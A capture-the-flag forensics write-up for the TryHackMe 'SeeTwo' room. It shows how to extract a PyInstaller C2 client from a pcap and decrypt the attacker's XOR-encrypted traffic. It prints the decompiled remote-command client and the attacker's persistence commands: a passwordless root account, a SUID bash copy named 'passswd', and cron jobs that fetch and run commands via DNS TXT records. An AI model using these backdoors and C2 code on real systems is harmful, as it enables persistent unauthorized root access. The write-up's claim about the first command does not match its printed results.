# [SeeTwo](https://tryhackme.com/room/seetworoom)

## Can you see who is in command and control?

# Investigation

You are tasked with looking at some suspicious network activity by your digital forensics team.

The server has been taken out of production while you analyze the suspicious behavior.

Click on the **Download Task Files** button at the top of this task. You will be provided with an **evidence.zip** file.
Extract the zip file's contents and begin your analysis in order to answer the questions.

### What is the first file that is read? Enter the full path of the file.

1. Open `evidence.pcap` in Wireshark and extract all HTTP objects. Navigate to `File -> Export Objects -> HTTP`, locate the file named `base64_client`, and save it to disk. This is a PyInstaller-compiled binary that was served over HTTP and encoded in Base64.

2. Decode the Base64-encoded file to recover the raw PyInstaller binary:

```bash
cat base64_client| base64 -d > client
```

3. Use `pyinstxtractor` to unpack the PyInstaller executable and extract the embedded Python bytecode:

```bash
python3 pyinstxtractor.py ./client
```

> This creates a `client_extracted/` directory containing all bundled `.pyc` files.

4. Decompile the extracted Python bytecode back to readable source using `uncompyle6`:

```bash
uncompyle6 -o client_extracted client_extracted/client.pyc
```

**client.py**

```py
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.13.12 (main, Feb  4 2026, 15:06:39) [GCC 15.2.0]
# Embedded file name: client.py
import socket, base64, subprocess, sys
HOST = "10.0.2.64"
PORT = 1337

def xor_crypt(data, key):
    key_length = len(key)
    encrypted_data = []
    for i, byte in enumerate(data):
        encrypted_byte = byte ^ key[i % key_length]
        encrypted_data.append(encrypted_byte)
    else:
        return bytes(encrypted_data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        received_data = s.recv(4096).decode("utf-8")
        encoded_image, encoded_command = received_data.split("AAAAAAAAAA")
        key = "MySup3rXoRKeYForCommandandControl".encode("utf-8")
        decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode("utf-8")), key)
        decrypted_command = decrypted_command.decode("utf-8")
        result = subprocess.check_output(decrypted_command, shell=True).decode("utf-8")
        encrypted_result = xor_crypt(result.encode("utf-8"), key)
        encrypted_result_base64 = base64.b64encode(encrypted_result).decode("utf-8")
        separator = "AAAAAAAAAA"
        send = encoded_image + separator + encrypted_result_base64
        s.sendall(send.encode("utf-8"))
```

5. In Wireshark, apply the filter `tcp.port == 1337` to isolate C2 traffic. Right-click on any matching packet and select `Follow > TCP Stream`. Change the display format to **Raw**, then save the full stream to a file. The stream contains the entire bidirectional C2 conversation.

[SCREEN01]

6. Write a Python script to extract and XOR-decrypt all commands and responses from the saved stream. The regex matches content after each `AAAAAAAAAA` separator up to the next Base64-encoded PNG header, which marks the start of the following C2 message:

```py
import re
import base64

file_path = 'b64traffic.txt'

xor_key = "MySup3rXoRKeYForCommandandControl"

def xor_decrypt(data, key):
    return ''.join(chr(data[i] ^ ord(key[i % len(key)])) for i in range(len(data)))

with open(file_path, 'r') as file:
    content = file.read()

pattern = r"AAAAAAAAAA(.*?)(?:iVBORw|$)"
matches = re.findall(pattern, content, re.DOTALL)

for match in matches:
    try:
        decoded_command = base64.b64decode(match.replace('\n', '').replace('\r', '').strip())

        decrypted_command = xor_decrypt(decoded_command, xor_key)

        print("Decrypted Command:", decrypted_command)
    except Exception as e:
        print("Error decoding command:", e)
```

**Results:**

```
Decrypted Command: id
Decrypted Command: uid=0(root) gid=0(root) groups=0(root)

Decrypted Command: echo 'toor::0:0:root:/root:/bin/bash' >> /etc/passwd
Decrypted Command:
Decrypted Command: tail -n 1 /etc/passwd
Decrypted Command: toor::0:0:root:/root:/bin/bash

Decrypted Command: cp /usr/bin/bash /usr/bin/passswd
Decrypted Command:
Decrypted Command: chmod u+s /usr/bin/passswd
Decrypted Command:
Decrypted Command: ls -l /usr/bin/passswd
Decrypted Command: -rwsr-xr-x 1 root root 1183448 Oct 27 03:07 /usr/bin/passswd

Decrypted Command: md5sum /usr/bin/passswd
Decrypted Command: 23c415748ff840b296d0b93f98649dec  /usr/bin/passswd

Decrypted Command: md5sum /usr/bin/bash
Decrypted Command: 23c415748ff840b296d0b93f98649dec  /usr/bin/bash

Decrypted Command: echo '* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"' >> /var/spool/cron/crontabs/root
Decrypted Command:
Decrypted Command: tail -n 1 /var/spool/cron/crontabs/root
Decrypted Command: * * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"

Decrypted Command: echo '* * * * * echo L2Jpbi9zaCAtYyAic2ggLWMgJChkaWcgZXYxbC50aG0gVFhUICtzaG9ydCBAbnMuVEhNe1NlZTJzTmV2M3JHZXRPbGR9LnRobSki | base64 | sh' >> /var/spool/cron/crontabs/bella
Decrypted Command:
Decrypted Command: tail -n 1 /var/spool/cron/crontabs/bella
Decrypted Command: * * * * * echo L2Jpbi9zaCAtYyAic2ggLWMgJChkaWcgZXYxbC50aG0gVFhUICtzaG9ydCBAbnMuVEhNe1NlZTJzTmV2M3JHZXRPbGR9LnRobSki | base64 | sh
```

7. The very first command the attacker issued was `cat /home/bella/.bash_history`, reading the user's shell history to harvest any credentials stored there.

**Answer:** `/home/bella/.bash_history`

---

### What is the output of the file from question 1?

1. From the decrypted C2 traffic, the response to `cat /home/bella/.bash_history` shows a single line. The user bella had previously run a MySQL command with a plaintext password directly in the shell.

**Answer:** `mysql -u root -p'vb0xIkSGbcEKBEi'`

---

### What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.

1. From the decrypted traffic, the attacker appended a new entry directly to `/etc/passwd`. The entry uses an empty password field, which bypasses password authentication entirely, granting immediate root-level access to anyone logging in as `toor`. The attacker confirmed the entry with `tail -n 1 /etc/passwd`.

**Answer:** `toor::0:0:root:/root:/bin/bash`

---

### What is the name of the backdoor executable?

1. From the decrypted traffic, the attacker copied `bash` to `/usr/bin/passswd`. Note the three `s` characters, a typosquatting technique designed to mimic the legitimate `passwd` binary. The SUID bit was then set on it, meaning any local user can run `/usr/bin/passswd -p` to drop into a root shell without needing a password. The `-rwsr-xr-x` permission confirmed by `ls -l` shows the SUID bit is active.

**Answer:** `/usr/bin/passswd`

---

### What is the md5 hash value of the executable from question 4?

1. From the decrypted traffic, the attacker verified the copy was successful by comparing the MD5 hashes of `/usr/bin/passswd` and the original `bash`. The identical hashes confirm `passswd` is a bit-for-bit copy of `bash`.

**Answer:** `23c415748ff840b296d0b93f98649dec`

---

### What was the first cronjob that was placed by the attacker?

1. From the decrypted traffic, the attacker installed two cron backdoors. The first was added to root's crontab and uses a DNS TXT record lookup against an attacker-controlled authoritative nameserver to fetch and execute a shell command every minute. This is a DNS-based C2 technique since outbound DNS traffic is rarely blocked, it acts as a covert channel to receive new commands without maintaining a direct TCP connection.

**Answer:** `* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"`

---

### What is the flag?

1. The flag is hidden inside the DNS nameserver domain used in the TXT record query. By inspecting the Base64 string in bella's crontab, you can also spot `VEhNe1NlZTJzTmV2M3JHZXRPbGR9` as a substring at a 4-character block boundary:

**Answer:** `THM{S**************d}`
